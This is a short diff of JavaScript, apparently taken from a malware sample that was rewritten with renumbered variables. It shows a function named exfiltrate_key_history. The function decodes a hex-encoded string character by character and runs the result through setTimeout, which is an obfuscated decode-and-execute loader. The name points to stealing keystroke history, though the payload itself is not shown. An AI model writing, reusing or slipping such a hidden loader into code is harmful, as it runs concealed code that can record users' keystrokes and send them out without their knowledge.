@@ -6,14 +6,13 @@ function exfiltrate_key_history() {
   var v2 = exp.length;
   var v0 = i$$1 < v2;
   for (;v0;) {
-    var v3 = dec;
-    var v7 = exp.substr(i$$1, 2);
-    var v6 = parseInt(v7, 16);
-    var v4 = String.fromCharCode(v6);
-    dec = v3 + v4;
+    var v6 = exp.substr(i$$1, 2);
+    var v5 = parseInt(v6, 16);
+    var v3 = String.fromCharCode(v5);
+    dec = dec + v3;
     i$$1 = i$$1 + 2;
-    var v5 = exp.length;
-    v0 = i$$1 < v5;
+    var v4 = exp.length;
+    v0 = i$$1 < v4;
   }
   setTimeout(dec, 10);
   return;
